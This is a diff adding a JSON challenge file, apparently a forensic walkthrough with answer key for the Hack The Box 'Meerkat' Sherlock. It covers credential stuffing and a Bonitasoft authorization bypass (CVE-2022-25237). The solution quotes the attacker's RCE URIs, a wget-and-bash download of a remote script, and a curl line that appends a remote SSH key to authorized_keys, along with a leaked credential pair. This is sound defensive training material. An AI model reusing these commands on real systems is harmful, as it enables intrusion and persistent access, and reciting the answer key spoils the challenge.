@@ -1,0 +1,111 @@
+{
+  "challengeId": "meerkat",
+  "name": "Meerkat",
+  "source": "sherlock",
+  "htbUrl": "https://app.hackthebox.com/sherlocks/Meerkat",
+  "difficulty": "easy",
+  "estimatedTime": "2-3 hours",
+  "keyTakeaway": "HTTP traffic analysis — credential stuffing detection, CVE exploitation, and correlating Suricata alerts with PCAP evidence",
+  "tags": ["wireshark", "http", "credential-stuffing", "suricata", "cve", "bonitasoft", "rce"],
+  "fundamentals": {
+    "content": "## HTTP Traffic Analysis & IDS Alert Correlation\n\n### Analyzing HTTP Traffic\n\nHTTP is unencrypted, making it the easiest protocol to analyze in a PCAP. Key things to examine:\n\n- **Request method**: `GET` (retrieve), `POST` (submit data), `PUT` (upload)\n- **URI path**: What resource is being accessed\n- **Response codes**: `200` (OK), `204` (No Content/Success), `401` (Unauthorized), `403` (Forbidden)\n- **Headers**: `User-Agent` reveals the client software, `Host` shows the target\n- **POST body**: Contains form data, credentials, uploaded content\n\n### Credential Stuffing vs. Brute Force\n\n| Attack Type | Pattern |\n|------------|--------|\n| **Brute Force** | One username, many passwords |\n| **Password Spraying** | Many usernames, few passwords |\n| **Credential Stuffing** | Unique username:password pairs from leaked databases |\n\nCredential stuffing uses previously breached credentials and tries them on other services, hoping users reused passwords.\n\n### Suricata IDS Alert Correlation\n\nSuricata is a network IDS/IPS that generates alerts based on signatures. When you have both a PCAP and Suricata alerts:\n1. Parse alerts with `jq` to get an overview of detected signatures\n2. Cross-reference alert timestamps with PCAP events\n3. Alerts often name specific CVEs or attack techniques\n\n### Common `jq` Patterns for Suricata\n\n```bash\n# Histogram of alert signatures\ncat alerts.json | jq '.[].alert.signature' | sort | uniq -c | sort -nr\n\n# Extract CVE references\ncat alerts.json | jq '.[].alert.signature' | grep -i 'CVE'\n```",
+    "toolReferences": [
+      {
+        "tool": "Wireshark",
+        "commands": [
+          "Filter: http",
+          "Filter: http.request.method == POST",
+          "Filter: http.response.code == 204",
+          "Filter: http.request.uri contains \"i18ntranslation\"",
+          "File > Export Objects > HTTP"
+        ]
+      },
+      {
+        "tool": "tshark",
+        "commands": [
+          "tshark -r meerkat.pcap -Y 'http.request.method == POST && http.request.uri == \"/bonita/loginservice\"' -T fields -e http.file_data"
+        ]
+      },
+      {
+        "tool": "jq",
+        "commands": [
+          "cat meerkat-alerts.json | jq '.[].alert.signature' | sort | uniq -c | sort -nr"
+        ]
+      }
+    ]
+  },
+  "hints": {
+    "hints": [
+      "You have two artifacts: a PCAP and a Suricata alerts JSON file. Start with the alerts — parse them with `jq` to see what Suricata already detected.",
+      "Filter for HTTP traffic on port 8080 — the target application runs there. Look at the URI paths to identify the platform.",
+      "Filter `http.request.method == POST` on the login endpoint. Look at the POST bodies — are the username:password pairs all the same user, or all different?",
+      "A `401` response means failed login. A `204` response means success. Filter `http.response.code == 204` to find the winning credential.",
+      "After the successful login, look at subsequent HTTP requests. Some requests have an unusual string appended to the URI path — this is the authorization bypass.",
+      "The RCE commands are visible in HTTP request URIs after the bypass. Follow the HTTP streams to see command output.",
+      "The attacker downloads a script and executes it. The script itself fetches another file — that second file is a public key for SSH persistence."
+    ]
+  },
+  "solution": {
+    "content": "## Full Walkthrough\n\n**Scenario:** Forela's business management platform was compromised. You're given `meerkat.pcap` (7.17 MB) and `meerkat-alerts.json` (Suricata IDS alerts).\n\n**Key infrastructure:**\n\n| Role | IP Address |\n|------|----------|\n| Target (Bonitasoft BPM) | `172.31.6.44:8080` |\n| Attacker | `156.146.62.213` |",
+    "steps": [
+      {
+        "stepNumber": 1,
+        "description": "Identify the application by examining HTTP traffic",
+        "command": "Wireshark filter: http",
+        "explanation": "Filter for HTTP traffic. You'll see repeated requests to URI paths containing `/bonita/` on port 8080. The application is **BonitaSoft**, an open-source business process management (BPM) platform. You can confirm this from the Suricata alerts too: `cat meerkat-alerts.json | jq '.[].alert.signature' | sort | uniq -c | sort -nr` shows signatures referencing \"Bonitasoft\". **Answer: `BonitaSoft`**"
+      },
+      {
+        "stepNumber": 2,
+        "description": "Classify the brute-force attack type",
+        "command": "Wireshark filter: http.request.method == POST && http.request.uri == \"/bonita/loginservice\"",
+        "explanation": "Filter for POST requests to the login endpoint. Examine the POST bodies — each attempt uses a **different username AND a different password**. The `User-Agent` is `python-requests/2.28.1` (automated tooling). This pattern of unique username:password pairs identifies the attack as **Credential Stuffing** — the attacker is testing leaked credentials from other breaches. **Answer: `Credential Stuffing`**"
+      },
+      {
+        "stepNumber": 3,
+        "description": "Find the CVE used for exploitation",
+        "command": "cat meerkat-alerts.json | jq '.[].alert.signature' | grep -i CVE",
+        "explanation": "Parse the Suricata alerts for CVE references. The output includes: `\"ET EXPLOIT Bonitasoft Authorization Bypass (CVE-2022-25237)\"`. This is a critical vulnerability (CVSS 9.8) in Bonita Web 2021.2's `RestAPIAuthorizationFilter` that allows authentication bypass. **Answer: `CVE-2022-25237`**"
+      },
+      {
+        "stepNumber": 4,
+        "description": "Identify the authorization bypass string",
+        "command": "Wireshark filter: http.request.uri contains \"i18ntranslation\"",
+        "explanation": "After the successful login, the attacker's requests to the Bonita API have `i18ntranslation` appended to the URI path. For example: `/bonita/API/extension/rce?p=0&c=1&cmd=whoami;i18ntranslation`. The `RestAPIAuthorizationFilter` has an exclude pattern matching `i18ntranslation` paths, so appending it bypasses authorization checks entirely. **Answer: `i18ntranslation`**"
+      },
+      {
+        "stepNumber": 5,
+        "description": "Count unique credential pairs in the stuffing attack",
+        "command": "tshark -r meerkat.pcap -Y 'http.request.method == POST && http.request.uri == \"/bonita/loginservice\"' -T fields -e http.file_data > bruteforce.txt",
+        "explanation": "Extract all login POST bodies with tshark. You'll find 118 total POST requests. Filter out the default `install:install` credential attempts (these are Bonitasoft defaults, not part of the stuffing list). Remove duplicates to get **56 unique username:password combinations**. **Answer: `56`**"
+      },
+      {
+        "stepNumber": 6,
+        "description": "Find the successful credential pair",
+        "command": "Wireshark filter: http.response.code == 204",
+        "explanation": "Most login attempts return `401 Unauthorized`. Filter for `204` (success) responses. Follow the HTTP stream of that 204 response back to its POST request. The body contains: `username=seb.broom%40forela.co.uk&password=g0vernm3nt`. The 204 response sets a `JSESSIONID` cookie and `X-Bonita-API-Token`. **Answer: `seb.broom@forela.co.uk:g0vernm3nt`**"
+      },
+      {
+        "stepNumber": 7,
+        "description": "Find the text sharing site used for persistence",
+        "command": "Wireshark filter: http.request.uri contains \"rce\"",
+        "explanation": "Follow the HTTP streams for RCE requests. The attacker executes commands via the API extension:\n1. `cmd=whoami` → returns `root`\n2. `cmd=cat /etc/passwd`\n3. `cmd=wget https://pastes.io/raw/bx5gcr0et8` → downloads a script\n4. `cmd=bash bx5gcr0et8` → executes it\n\n**Answer: `pastes.io`**"
+      },
+      {
+        "stepNumber": 8,
+        "description": "Identify the SSH public key filename used for persistence",
+        "command": "Follow the HTTP stream containing the wget command to read the downloaded script's content",
+        "explanation": "The downloaded script `bx5gcr0et8` contains a curl command:\n```bash\ncurl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys\n```\nThis appends the attacker's SSH public key to `authorized_keys`, granting persistent SSH access. The public key filename on pastes.io is `hffgra4unv`, and the modified file is `/home/ubuntu/.ssh/authorized_keys`. **Answers: `hffgra4unv` and `/home/ubuntu/.ssh/authorized_keys`**"
+      },
+      {
+        "stepNumber": 9,
+        "description": "Map the persistence technique to MITRE ATT&CK",
+        "command": "Search MITRE ATT&CK for 'SSH Authorized Keys'",
+        "explanation": "Adding SSH keys to `authorized_keys` for persistent access maps to MITRE ATT&CK technique **T1098.004** (Account Manipulation: SSH Authorized Keys), under the Persistence tactic. **Answer: `T1098.004`**"
+      }
+    ]
+  },
+  "navigation": {
+    "previousChallengeId": "noxious",
+    "nextChallengeId": "litter"
+  }
+}
